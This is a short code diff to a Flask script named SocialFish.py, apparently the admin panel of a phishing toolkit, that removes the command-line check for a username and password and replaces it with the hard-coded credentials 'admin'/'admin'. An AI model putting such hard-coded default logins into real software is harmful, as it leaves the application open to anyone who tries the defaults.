@@ -20,12 +20,9 @@ import flask_login
 import os
 
 # Verificar argumentos
-if len(argv) < 2:
-    print("./SocialFish <youruser> <yourpassword>\n\ni.e.: ./SocialFish.py root pass")
-    exit(0)
 
 # Temporario
-users = {argv[1]: {'password': argv[2]}}
+users = {'admin': {'password': 'admin'}}
 
 # Definicoes do flask
 app = Flask(__name__, static_url_path='',
